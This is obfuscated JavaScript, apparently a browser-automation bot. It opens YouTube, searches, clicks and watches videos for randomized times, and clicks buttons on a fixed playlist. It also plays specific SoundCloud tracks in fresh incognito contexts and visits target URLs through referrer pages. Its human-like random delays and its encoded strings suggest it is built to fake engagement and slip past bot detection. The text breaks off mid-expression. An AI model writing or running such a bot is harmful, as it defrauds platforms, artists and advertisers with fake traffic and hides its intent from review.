function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x5b7 * 0x1 + -0xc97 + 0x6 * 0x30d);
    let h = e[f];
    return h;
  }, d(b, c);
}
const Y = b,
  X = c,
  W = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x1226 * -0x1 + -0x6f + -0x11b6))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x1 * 0x11cf + -0xf77 * -0x1 + -0x2146 * 0x1), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x239f * 0x3 + 0x2 * 0x136b + 0xb937 * 0x1 + (-0x1 * -0x1924 + 0x18d5 + 0x89f) * random()) : await standardWaitForNetIdle(f), await wait(-0x1 * 0x112 + -0x10c3 + 0x1 * 0x255d + (-0x4b84 + 0x4c8e * -0x1 + 0xbf22) * random()), -0x4 * -0x2f8 + -0x23ea + -0x5 * -0x4cf;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x1f86 + -0x28d * -0x1 + -0x33 * 0x49), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x31 * 0x25 + -0x1ad1 + 0x3 * 0xb4d;
}
async function randomWait() {
  return await wait(0x1fe * 0xc + -0x19b5 * 0x1 + 0x1555 + (-0x1 * -0x189d + -0x1be7 + 0x16d2) * random()), 0x1 * 0x11a1 + 0x2684 + 0x4 * -0xe09;
}
async function watchRandomFrontScreenVideo(f) {
  const a6 = {
    f: 0xf
  };
  await f['evaluate'](() => {
    const R = d;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + R(a6.f) + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x7 * 0x287 + -0xbfe + -0x5b3, 0x823 + 0x1549 + 0xaf * -0x2b), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0xc1c2 * -0x1 + -0x1 * 0x1ae85 + -0x1d * -0x103f) * getRandomInt(0x9cc + -0x1712 + 0xd48, -0x1 * 0x2632 + 0x4 * 0x301 + 0x1a33), h)), 0x166d * -0x1 + -0x1dfe + 0x346c;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x5b7 * 0x1 + -0xc97 + 0x6 * 0x30d);
    let h = e[f];
    if (c['gYoLdu'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0xd58 + 0x2688 + -0x1930, r, s, t = 0x313 * -0x7 + -0xbd + 0x1642; s = m['charAt'](t++); ~s && (r = q % (-0x1226 * -0x1 + -0x6f + -0x11b3) ? r * (0x1 * 0x11cf + -0xf77 * -0x1 + -0x1083 * 0x2) + s : s, q++ % (-0x2f8 * 0x6 + 0x1 * 0x679 + 0xb5b * 0x1)) ? o += String['fromCharCode'](-0x1 * -0x862 + 0x847 + -0xfaa & r >> (-(-0x1 * 0x112 + -0x10c3 + 0x1 * 0x11d7) * q & -0x25c2 + 0x2647 * -0x1 + 0x4c0f)) : -0x4 * -0x2f8 + -0x23ea + -0x11 * -0x16a) {
          s = n['indexOf'](s);
        }
        for (let u = 0x1f86 + -0x28d * -0x1 + -0x3d * 0x8f, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x31 * 0x25 + -0x1ad1 + 0x9 * 0x3c6))['slice'](-(0x1fe * 0xc + -0x19b5 * 0x1 + 0x1cf));
        }
        return decodeURIComponent(p);
      };
      c['PMELUM'] = i, b = arguments, c['gYoLdu'] = !![];
    }
    const j = e[-0x1 * -0x189d + -0x1be7 + 0x34a],
      k = f + j,
      l = b[k];
    return !l ? (h = c['PMELUM'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0xa62 + 0x26cb * 0x1 + -0x1 * 0x312d;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0xe5 * 0x21 + -0x3 * 0x4e4 + -0xed8]['split']('\x20');
    for (let k = -0xc76 + -0x2 * 0x24 + 0x1 * 0xcbe; k < i['length']; k += -0x3aa + 0x5 * 0xd + 0x36b)
      j += i[k] * h[i[k + (0x159f + -0x25 * -0x65 + -0x2437)]];
    return j;
  });
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x5b7 * 0x1 + -0xc97 + 0x6 * 0x30d);
    let h = e[f];
    if (b['FeqRQs'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0xd58 + 0x2688 + -0x1930, s, t, u = 0x313 * -0x7 + -0xbd + 0x1642; t = n['charAt'](u++); ~t && (s = r % (-0x1226 * -0x1 + -0x6f + -0x11b3) ? s * (0x1 * 0x11cf + -0xf77 * -0x1 + -0x1083 * 0x2) + t : t, r++ % (-0x2f8 * 0x6 + 0x1 * 0x679 + 0xb5b * 0x1)) ? p += String['fromCharCode'](-0x1 * -0x862 + 0x847 + -0xfaa & s >> (-(-0x1 * 0x112 + -0x10c3 + 0x1 * 0x11d7) * r & -0x25c2 + 0x2647 * -0x1 + 0x4c0f)) : -0x4 * -0x2f8 + -0x23ea + -0x11 * -0x16a) {
          t = o['indexOf'](t);
        }
        for (let v = 0x1f86 + -0x28d * -0x1 + -0x3d * 0x8f, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x31 * 0x25 + -0x1ad1 + 0x9 * 0x3c6))['slice'](-(0x1fe * 0xc + -0x19b5 * 0x1 + 0x1cf));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1 * -0x189d + -0x1be7 + 0x34a,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1 * 0x11a1 + 0x2684 + 0x9 * -0x63d; u < 0x7 * 0x287 + -0xbfe + -0x4b3; u++) {
          p[u] = u;
        }
        for (u = 0x823 + 0x1549 + 0x10d * -0x1c; u < -0x1026 * -0x1 + -0x5 * 0x72d + -0x1d * -0xb7; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x9cc + -0x1712 + 0xe46), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1 * 0x2632 + 0x4 * 0x301 + 0x1a2e, q = 0x166d * -0x1 + -0x1dfe + 0x346b;
        for (let v = 0xa62 + 0x26cb * 0x1 + -0x1 * 0x312d; v < n['length']; v++) {
          u = (u + (0xe5 * 0x21 + -0x3 * 0x4e4 + -0xed8)) % (-0xc76 + -0x2 * 0x24 + 0x1 * 0xdbe), q = (q + p[u]) % (-0x3aa + 0x5 * 0xd + 0x469), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x159f + -0x25 * -0x65 + -0x2338)]);
        }
        return t;
      };
      b['bvqrME'] = m, c = arguments, b['FeqRQs'] = !![];
    }
    const j = e[-0xc93 + 0x502 + 0x791],
      k = f + j,
      l = c[k];
    return !l ? (b['TWoOrI'] === undefined && (b['TWoOrI'] = !![]), h = b['bvqrME'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const T = d,
      S = b,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))[S(0x1a, '[ZeZ')](l => 'style-scop' + T(0xe) + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0xc93 + 0x502 + 0x797)['map'](l => Array['from'](l['children']))['flat'](-0x1e2d + -0x321 + -0x214f * -0x1)['map'](l => l['childNodes'][0x4 * 0x1c9 + 0x63d + 0x20 * -0x6b]['childNodes'][0x3 * -0x78d + -0xe3 * -0x1a + -0x67 * 0x1]['childNodes'][0x1027 + -0x18 * 0xb5 + -0x1 * -0xd2]['childNodes'][0x4c3 * 0x6 + 0x9ed + -0x267f]['childNodes'][-0x25be + -0x112d + 0x14 * 0x2bf]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x43a * 0x1 + 0x20b3 + -0x2105, 0x22a * -0x12 + -0x1a55 + -0x54d1 * -0x1)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x25 * -0x3 + -0x187d + -0x4 * -0x14e1);
  const h = await getMaxTime(f),
    i = Math['min']((-0xf537 + -0xfb8e + 0x2db25) * getRandomInt(0x1391 * -0x1 + 0x15cd + -0x23a, 0x2ea * 0x7 + 0x1 * 0x2510 + -0x3971), h);
  return await wait(i), -0x12b1 + 0xc4d + -0x665 * -0x1;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x7 * -0x3e0 + 0x1 * -0x5cb + 0x7f * -0x2b]['children'][0xc0e + -0x8b5 + -0x359]['children'][-0x1 * -0x1367 + 0x2688 + -0x39ef]['children'][0x8e * -0x43 + 0x3 * 0xa61 + 0x607]['children'][-0x5f * 0x3 + -0x17ba + -0x1 * -0x18d7]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0xab5 * -0x2 + -0x184b + 0x2db6;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x3 * -0xfa + -0x954 * -0x1 + -0xbde + (-0x3 * -0x490 + -0x1c24 + 0xea6) * random()
  }), await wait(0x20e0 + 0x2324 + 0x4 * -0x1084 + (0x3 * -0x94d + -0x1c2b + 0x393e) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x4a * 0x13 + 0x1ca6 + -0x11 * 0x202]['childNodes'][-0x610 + -0x2e4 * -0x3 + -0x29b]['childNodes'][-0x119f + 0x1 * -0x1cbd + -0xd * -0x391]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1801 + 0x1261 + -0x1 * -0x5a5]['childNodes'][0x15 * -0x27 + 0x6b + 0x4 * 0xb2]['childNodes'][-0x7a7 * 0x2 + 0x1e81 + -0xf31]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x181 + 0x347 * -0x8 + -0x4 * -0x62e),
          r = 0x1 * 0x1701 + -0x14d + -0x15b4;
        for (let u = 0x1b9f + 0x1cd + -0x1d6c; u < q['length']; u += -0x1 * 0x1a2d + 0x1776 + -0x29 * -0x11)
          r += q[u] * k[q[u + (0x4 * -0x902 + -0x226b + 0x4674)]];
        return r;
      }(n);
  });
  await wait((0xaf1 * 0x6 + -0x6001 * -0x1 + -0x670f) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x590 * 0x2 + -0xb5ba + 0x1ab3a) * getRandomInt(0x1c0 * -0x2 + -0x1 * 0x1a3f + 0x1dc0, -0x5 * 0x239 + 0x3 * 0x678 + -0x841), h + (-0x11d2 + 0x1b03 + 0xa57));
  return await wait(i), -0x706 * 0x4 + -0x1473 + -0x1846 * -0x2;
}
async function keyWatch(f) {
  const U = d;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1 * 0x1f07 + 0x1c13 + 0x2f4), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + U(0x19) + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    const V = b;
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f[V(0x14, 'neG2')](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x1 * -0x477 + 0x106c + -0x92b + (-0xb14 + -0xbce + 0x17d * 0x12) * Math['random']());
    });
  }, 0x1255 * -0x2 + 0x1e * -0x165 + 0x1 * 0x69d8);
  await wait(0x45253 + -0x44 * 0x833 + 0x26f19);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x1d19f + 0xf04c + -0x7 * 0x435d) * getRandomInt(0x1 * -0x926 + -0xc9d + 0x5 * 0x45b, -0x1ce4 + -0x1 * 0x250a + 0x1 * 0x4207)), clearInterval(h), -0x6 * -0x634 + -0x11c5 * -0x2 + -0x48c1;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x1c6f + -0x5fc * -0x2 + -0x2867;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x35b * -0xb + -0xa39 + -0x449 * -0xb;
    await randomWait();
  }
  return 0x1 * -0x2710 + -0x22c6 * 0x1 + -0x3 * -0x189d;
}

function fetchRandomSC() {
  return Math['random']() <= 0x1d35 + -0x3 * -0x216 + -0x7 * 0x511 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x19cf + -0x24f5 * -0x1 + 0xa76 * -0x6 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x13ea + -0xc47 + -0x7a3 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x1ff * 0x2 + 0x15e9 + -0x15d * 0x13;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x1c * -0x78 + -0x10a5b + -0x9 * -0x2fab + getRandomInt(-0x4faf + -0x4d1b * 0x1 + 0xd762, -0xfb * 0xd5 + 0x40f1 + -0x17 * -0xb5a));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x25c7 + -0x2 * -0x1135 + -0xf0 * 0x4d), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x8e5 + -0xec3 + 0x17a8;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x3c6 + -0x15fe + 0x1 * 0x19c4, -0x1cc5 + 0x6b * -0x23 + 0x5a * 0x7c)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x472 + 0xa1 * 0x39 + -0x207b + floor((0x2 * -0x3fa + 0x363 + 0x879) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x885af32e + 0x405fd4f6 + 0x1 * -0x48bac824),
          0x2 * 0x59c53a + -0x1 * -0xc519b6 + -0xf8a42a,
          -0x3 * 0x4cfd + -0x1 * -0x82dd + -0xe * -0x104b,
          -0x19f * 0x6 + 0x1 * 0x20b3 + -0xb * 0x20b
        ], y = [
          -0x37e * -0xb + -0x190f + 0x23 * -0x61,
          -0x8 * 0x48f + 0x1 * -0x1c6 + 0x264e,
          0x7 * -0x371 + -0x2 * 0xa6d + 0x1 * 0x2cf9,
          0x21df * -0x1 + 0x1310 + -0xdf * -0x11
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x4ee * -0x4 + -0x7b * -0x1f + -0x4 * 0x8a7)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x42 + -0x99f + 0x9e1; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x106 + 0x7a2 * -0x1 + -0x9 * -0xbc) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x1cec + -0x12 * -0x69 + -0x6 * 0x60d] = A[0x184b + -0x19e3 * -0x1 + -0xa06 * 0x5] = A[0x1283 + -0x673 + -0xc0f] = A[-0xd92 + -0x1776 + -0x1 * -0x250a] = A[0xa1 * -0x23 + 0x14d5 + -0x5 * -0x3d] = A[0x3 * 0x7b9 + -0xe * -0x62 + 0x981 * -0x3] = A[-0x1f85 * -0x1 + 0x9 * 0x33d + -0x3ca5] = A[0x685 + 0x1933 + -0x1 * 0x1fb2] = A[-0x2 * 0x1087 + -0xb0a + -0x1 * -0x2c1f] = A[-0x139 * -0x7 + 0x1705 + 0xa84 * -0x3] = A[0x585 * 0x6 + -0xa28 + 0x16ed * -0x1] = A[0x796 * 0x4 + -0x3 * 0x64d + -0x7 * 0x1a1] = A[0x6b * -0x15 + -0x5ae + 0xe80] = A[-0xea + 0x2115 + -0x201f] = A[-0x249d + 0x17d * -0x19 + 0x49df] = A[0x135 * -0x18 + 0x3 * -0x3b9 + 0x2831 * 0x1] = A[0x1 * -0x227e + 0x9 * 0x82 + 0x1dfb] = -0x21 * 0x45 + -0x452 * -0x5 + -0xcb5, this['blocks'] = A) : this['blocks'] = [
                -0x22c7 + -0x1337 + 0x35fe,
                -0x254a + -0x18b * 0x17 + 0x259 * 0x1f,
                0x1 * 0x1e50 + 0x1b21 + -0x3971,
                -0x4b4 + -0x1 * -0x62d + -0x179,
                0xa5b + 0x1c2d * 0x1 + -0x2688,
                0x6a1 + 0x1 * 0x17b2 + -0x1e53 * 0x1,
                0x1877 + 0x46f + -0x1ce6,
                -0xc1e + 0xf33 + -0x315,
                0xa6c * 0x2 + -0x9 * -0x191 + -0x22f1,
                0x12c6 + 0x16a3 + -0x2969,
                -0x1c1c + -0xfd7 + 0x2bf3,
                -0x11f9 + 0x1 * -0xa1 + -0x129a * -0x1,
                -0x153d + -0x1afa + 0x3037 * 0x1,
                -0x3 * -0x30d + 0x1b13 + -0x243a,
                -0x7 * 0x33 + 0x1310 + -0x1 * 0x11ab,
                0x109f + -0x1 * -0x22d1 + 0xcdc * -0x4,
                0x126f + 0x1691 + -0x2900
              ], this['h0'] = -0x201f * -0x59860 + 0x713 * -0xf36fa + 0x1f2d99ef, this['h1'] = -0x3e05e761 * 0x1 + 0xdd3751f + 0x120001dcb, this['h2'] = -0x5c95d581 * 0x2 + 0x2666025c + 0x12b8085a4, this['h3'] = 0x495ddcb + 0x111bdcf7 + -0x57f664c, this['h4'] = 0x214efda1 + 0x133b1082f * -0x1 + -0x10d2 * -0x1bf467, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0xcf6 + 0x1 * -0x4b7 + 0x5 * 0x389, this['finalized'] = this['hashed'] = -0xc * -0x5d + 0x4 * 0x83 + -0x668, this['first'] = -0x898 + -0x226d + 0x2b06;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x2464 + -0x1ed7 + -0x1 * -0x433b, O = J['length'] || -0x22be + 0x13 * -0x171 + 0x3e21, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x18c9 + -0x1675 + 0x4 * -0x95, P[0x4 * 0x463 + -0xb * -0x313 + -0x335d] = this['block'], P[0x2f * -0x2 + 0x1dac + -0x1d3e] = P[0x70a * -0x1 + 0x595 + 0x176 * 0x1] = P[0x142c + -0x1 * 0x117e + 0xc * -0x39] = P[-0xd99 + 0x9cf + 0x7 * 0x8b] = P[0x1308 + 0x262e + -0x3932 * 0x1] = P[-0xaf6 + -0x1 * 0xe2 + -0xbdd * -0x1] = P[0x259b + -0x14b4 + -0x10e1] = P[0x6 * 0x213 + -0x1518 + 0x1 * 0x8ad] = P[-0x1e78 + 0x26cc + -0x84c] = P[0x1 * 0xc36 + 0xf7a + 0x1 * -0x1ba7] = P[0x95 * 0x17 + -0x839 + -0x8 * 0xa4] = P[-0x186c + -0x23 * 0x13 + 0x1b10] = P[0x17bc + -0x2 * -0x96b + -0x2 * 0x1543] = P[0x2a2 * 0x1 + 0x1677 + -0x190c] = P[-0x254c + 0x2 * 0x1080 + -0x45a * -0x1] = P[-0x1425 * -0x1 + 0x4a3 * -0x5 + 0x319] = 0x4 * 0x60d + 0x1 * -0x37c + -0x14b8), K) {
                    for (N = this['start']; M < O && N < 0x15c * -0x18 + 0x128d * -0x1 + -0x1 * -0x336d; ++M)
                      P[N >> -0x5cb + -0x1aca + 0x2097] |= J[M] << y[-0x3c2 + 0x1c8b * -0x1 + 0x2050 * 0x1 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x68e + -0x13 * -0x37 + 0x2b9; ++M)
                      (L = J['charCodeAt'](M)) < 0x1aff + -0x2547 + 0xac8 ? P[N >> 0x6f6 + -0x1534 + 0xe40] |= L << y[-0x1760 + 0x1 * 0x1822 + -0xbf & N++] : L < 0x2232 + -0xa28 + -0x100a ? (P[N >> -0xfb7 + -0x1eda + 0x2e93] |= (0x9 * 0x293 + 0x6bb + -0x1d26 | L >> 0x1094 + 0x12d1 + -0x235f) << y[0x14c4 + 0x1fb1 * -0x1 + 0xaf0 & N++], P[N >> 0xa * 0x249 + -0x1 * -0x14df + 0x1f * -0x169] |= (0xb5f * 0x1 + -0x6b * 0x23 + 0x3c2 | -0x747 + 0x23ad * 0x1 + 0x1 * -0x1c27 & L) << y[-0x2 * 0xc89 + -0x6c0 + 0x1fd5 & N++]) : L < 0x13d9f + 0xf61b + 0xaddd * -0x2 || L >= -0x1 * -0x8d97 + 0x1f * 0xbcf + -0x4 * 0x46ea ? (P[N >> 0xbf + 0x559 + -0x616] |= (0x2 * 0x12ad + 0x2eb + -0x2765 | L >> 0x16a8 + -0xa * -0x79 + -0x1b56) << y[0x147c + -0x2207 + 0xa * 0x15b & N++], P[N >> 0x43 * 0x56 + 0x22b8 + 0xe4e * -0x4] |= (-0x19d3 * -0x1 + -0x1171 + -0x7e2 | L >> 0x1cdf * -0x1 + 0x1 * -0x5b5 + 0x229a & -0x1 * -0x2467 + 0x1 * -0xde9 + 0x163f * -0x1) << y[-0x25e1 + -0xaf9 + 0x30dd & N++], P[N >> -0x17c6 + 0xbdb + -0xbed * -0x1] |= (0x15ce + 0x4 * 0x849 + -0x2 * 0x1b39 | 0xaba + -0x6 * -0x39f + -0x2035 & L) << y[0x1620 + 0x1166 + -0x1 * 0x2783 & N++]) : (L = -0x14d23 * 0x1 + -0xa93a + -0x1 * -0x2f65d + ((0x124e + 0x1 * 0xbfe + -0x1a4d & L) << -0x1ae * 0x5 + 0xc2 * -0x1f + 0x1fee | -0xa67 + -0x1130 + 0x1f96 & J['charCodeAt'](++M)), P[N >> -0x3 * 0x37 + -0xd31 + -0x2 * -0x6ec] |= (0x2 * -0xa89 + -0x1 * -0x105 + -0xc7 * -0x1b | L >> 0x1751 + -0x192c + 0x1ed) << y[-0x891 + 0x1 * -0x1cae + 0x2 * 0x12a1 & N++], P[N >> 0x2623 + 0x2128 + -0x4749] |= (-0x1939 * -0x1 + -0x229c + 0x9e3 | L >> -0x4b4 + 0x211 * -0x7 + 0x1337 & -0x1b18 + 0x12a7 + 0x8b0) << y[-0x15 * -0x1b + 0x3e * 0x20 + -0x9f4 & N++], P[N >> -0x241f + -0x538 * 0x3 + -0x1b * -0x1eb] |= (-0x7e4 + -0x1723 + 0x1f87 | L >> 0x2 * 0xd71 + 0x21da + -0x3cb6 & 0x1 * -0xeaf + -0x2 * 0x10bb + 0x4 * 0xc19) << y[0x213c + 0x1251 * -0x1 + -0xee8 & N++], P[N >> 0x1 * 0x18bc + -0x731 + -0x1189] |= (-0x335 + -0x826 * -0x2 + -0xc97 | 0x29e * -0xd + -0x1a * -0xdf + 0xb9f * 0x1 & L) << 